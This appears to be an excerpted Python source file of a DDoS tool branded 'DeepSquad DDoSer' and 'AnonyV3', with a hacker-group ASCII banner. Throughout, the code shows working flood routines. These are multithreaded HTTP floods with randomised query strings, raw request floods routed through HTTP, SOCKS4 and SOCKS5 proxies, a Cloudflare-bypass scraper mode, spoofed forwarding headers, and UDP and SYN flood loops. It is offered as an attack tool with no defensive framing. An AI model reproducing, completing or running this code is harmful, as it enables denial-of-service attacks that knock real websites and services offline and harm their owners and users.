...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' + random.choice(['c']) +
                  " & cls & title DeepSquad DDoSer Tool")
    print('''
               - Nexus Squad on top -
███▄    █ ▓█████ ▒██   ██▒ █    ██   ██████ 
 ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░ ██  ▓██▒▒██    ▒ 
...
def proxies_list():
    ...
    if sys.platform.startswith("linux"):
        ...
        for file in glob("*.txt"):
            print("|_--> " + file)
    out_file = str(input("[+] " + str(filenam2) +
                   " [" + str(filenam1) + ".txt]: "))
    if out_file == "":
...
class raw_dos(threading.Thread):
    ...
    def run(self):
        ...
        if method_attack == "1":
            ...
            requests.get(
                url + "/?=" + str(random.randint(0, 20000)), headers=headersx)
        while True:
            try:
                if method_attack == "1":
                    requests.get(url, headers=headersx)
                    ...
                    requests.get(
                        url + "/?=" + str(random.randint(0, 20000)), headers=headersx)
                print("[+] Attack/AnonyV3 | Raw-DoS @ " + str(random.randint(0,
                      1000)) + " => " + str(host_url) + ":" + str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
...
class Proxy(threading.Thread):
    ...
    def run(self):
        ...
        randomip = str(random.randint(1, 255)) + "." + str(random.randint(0, 255)) + \
        ...
        if method_attack == "1":
            ...
            get_host = random.choice(['GET', 'POST', 'HEAD']) + " /?=" + str(random.randint(
                0, 20000)) + " HTTP/1.1\r\nHost: " + host_url+":"+str(port) + "\r\n"
            request = get_host + useragent + accept + \
                referer + forward + connection + "\r\n"
        ...
        while True:
            try:
                ...
                # sys.stdout.flush()
                print("[!] Attack/AnonyV3 | Proxy @ " + str(proxy[0]) +
                      " => [" + host_url + ":" + str(port) + "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] Attack/AnonyV3 | Socks5 @ " + str(proxy[0]
                                                             ) + " => [" + host_url + ":" + str(port) + "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] Attack/AnonyV3 | Socks4 @ " + str(proxy[0]
                                                                 ) + " => [" + host_url + ":" + str(port) + "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] Attack/AnonyV3 | Home @ " + str(random.randint(0,
                      1000)) + " => " + str(host_url) + ":" + str(port))
                #req_code += 1
                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                # sys.stdout.flush()
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    http.request(
                        "GET /?=" + str(random.randint(0, 20000)), headers=headersx)
                print("[+] Attack/AnonyV3 | JS-Normal @ " +
                      str(random.randint(0, 1000)) + " => " + str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url, headers=headersx)
                except:
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    soso = scraper.get(
                        url + "?=" + str(random.randint(0, 20000)), timeout=15)
                print("[+] Attack/AnonyV3 | JS-Normal @ " +
                      str(random.randint(0, 1000)) + " => " + str(host_url))
                #req_code += 1
                try:
...
def udpflood():
    ...
    while True:
        ...
        try:
            req_code += 1
            s.sendto(bytes, tar)
            sys.stdout.write("[+] UDP Flood | [" + host_url + ":" + str(port) +
                             "] | Sent [" + str(req_code) + "] | Error: [" + str(error) + "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes, tar)
                    req_code += 1
                    sys.stdout.write("[+] UDP Flood | [" + host_url + ":" + str(
                        port) + "] | Sent [" + str(req_code) + "] | Error: [" + str(error) + "]\r")
                    sys.stdout.flush()
            except:
                try:
                    s.close()
        ...
        while True:
            ...
            try:
                ...
                try:
                    ...
                    pass
            sys.stdout.write("[+] SYN Flood [ DDoS ] | Sent [" +
                             str(req_code) + "] | Error: [" + str(error) + "]\r")
            sys.stdout.flush()
